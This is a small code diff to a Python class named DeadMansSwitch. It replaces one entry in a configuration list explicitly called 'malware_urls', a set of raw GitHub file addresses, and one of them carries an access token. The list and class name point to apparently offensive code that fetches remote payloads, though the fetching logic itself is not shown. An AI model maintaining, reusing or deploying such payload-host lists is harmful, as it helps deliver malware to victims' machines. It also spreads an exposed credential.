@@ -476,7 +476,7 @@ class DeadMansSwitch:
         # Configuration URLs (MUST BE UPDATED)
         self.malware_urls = [
             "https://raw.githubusercontent.com/ywwgbdqjmdad-ux/fantastic-octo-meme/refs/heads/main/deepseek_python_20251123_1133b4_READABLE.py?token=GHSAT0AAAAAADKJL6E6LD7ANFQT7YSIBXHE2K62Z2A",
-            "https://raw.githubusercontent.com/nuojjijia/ubiquitous-succotasha2123456/refs/heads/main/deepseek_python_20251123_1133b4%20-%20Copy.py",
+            "https://raw.githubusercontent.com/ywwgbdqjmdad-ux/cuddly-telegrama23swed45rf6gt7hy8uj/refs/heads/main/deepseek_python_20251123_1133b4_READABLE.py",
             "https://raw.githubusercontent.com/ywwgbdqjmdad-ux/special-octo-computing-machines3wed4r5gt6hy78uj9/refs/heads/main/deepseek_python_20251123_1133b4_READABLE.py"
         ]
         
